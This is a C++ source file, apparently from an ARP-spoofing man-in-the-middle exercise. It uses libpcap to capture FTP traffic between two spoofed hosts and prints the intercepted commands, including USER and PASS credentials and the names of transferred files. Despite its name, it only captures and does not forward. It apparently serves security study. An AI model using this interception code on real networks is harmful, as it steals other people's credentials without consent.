#include "../incs/capture_and_forward.hpp"

extern bool stop;
extern bool verbose;

void capture_and_forward(
	const std::string& ip_src,
	const std::string& mac_src,
	const std::string& ip_target,
	const std::string& mac_target
	)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle;
    struct pcap_pkthdr header;
    const u_char* packet;

    // Open the network interface for packet capturing
    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        std::cerr << "Error opening interface: " << errbuf << std::endl;
        return;
    }

    // Set the filter to capture only packets with destination port 21 (FTP)
    struct bpf_program fp;
    std::string filter = "dst port 21";
    if (pcap_compile(handle, &fp, filter.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) {
        std::cerr << "Error compiling filter: " << pcap_geterr(handle) << std::endl;
        pcap_close(handle);
        return;
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        std::cerr << "Error setting filter: " << pcap_geterr(handle) << std::endl;
        pcap_close(handle);
        return;
    }

    // Start capturing and forwarding packets
    while (!stop) {
        packet = pcap_next(handle, &header);
        
        // std::string packetContent(reinterpret_cast<const char*>(packet), header.len);
        // std::cout << "Packet content: " << packetContent << std::endl;

        // struct ip *ipHeader;
        // struct tcphdr *tcpHeader;
        // u_char *payload;

        // Get IP and TCP headers
        struct ip *ipHeader = (struct ip *)(packet + 14); // Assuming Ethernet header length is 14 bytes
        struct tcphdr *tcpHeader = (struct tcphdr *)(packet + 14 + ipHeader->ip_hl * 4); // Calculate TCP header position

        // Get payload (FTP command)
        const u_char *payload = packet + 14 + ipHeader->ip_hl * 4 + tcpHeader->th_off * 4;
		

		//Check if the mac address of the sender is the same as the one we want to spoof
        const char *srcIP = inet_ntoa(ipHeader->ip_src);
		if (strcmp(srcIP, ip_src.c_str()) && strcmp(srcIP, ip_target.c_str()))
			continue;


        // Check if it's an FTP command packet (assuming payload starts with "USER", "PASS", etc.)
        if (strncmp((const char *)payload, "USER", 4) == 0 ||
            strncmp((const char *)payload, "PASS", 4) == 0 ||
			strncmp((const char *)payload, "CDUP", 4) == 0 ||
            strncmp((const char *)payload, "LIST", 4) == 0 ||
            strncmp((const char *)payload, "RETR", 4) == 0 ||
            strncmp((const char *)payload, "STOR", 4) == 0 ||
			strncmp((const char *)payload, "DELE", 4) == 0 ||
			strncmp((const char *)payload, "RNFR", 4) == 0 ||
			strncmp((const char *)payload, "RNTO", 4) == 0 ||
			strncmp((const char *)payload, "SIZE", 4) == 0 ||
			strncmp((const char *)payload, "SYST", 4) == 0 ||
			strncmp((const char *)payload, "NOOP", 4) == 0 ||
			strncmp((const char *)payload, "ABOR", 4) == 0 ||
			strncmp((const char *)payload, "QUIT", 4) == 0 ||
			strncmp((const char *)payload, "CWD", 3) == 0 ||
			strncmp((const char *)payload, "PWD", 3) == 0 ||
			strncmp((const char *)payload, "MKD", 3) == 0 ||
			strncmp((const char *)payload, "RMD", 3) == 0) {

            // Print FTP command is verbose mode is on
            if (verbose)
                std::cout << "FTP Command: " << payload << std::endl;

            // Extract filename (if applicable)
            if (strncmp((const char *)payload, "RETR", 4) == 0 || strncmp((const char *)payload, "STOR", 4) == 0) {
                // Assuming the filename is specified as the parameter after the FTP command
                const char *filename = strchr((const char *)payload, ' ');
                if (filename != nullptr) {
                    std::cout << "Filename: " << filename << std::endl;
                }
            }
        }
        // //print filenames
        // if (packet[0] == '2' && packet[1] == '2' && packet[2] == '0') {
        //     std::cout << "File name: ";
        //     for (int i = 4; i < header.len; i++) {
        //         std::cout << packet[i];
        //     }
        //     std::cout << std::endl;
        // }

        // //if verbose, print all ftp commands
        // if (verbose) {
        //     std::cout << "Packet content: " << std::endl;
        //     for (int i = 0; i < header.len; i++) {
        //         std::cout << packet[i];
        //     }
        //     std::cout << std::endl;
        // }
    }

    // Clean up and close the packet capture handle
    pcap_close(handle);
}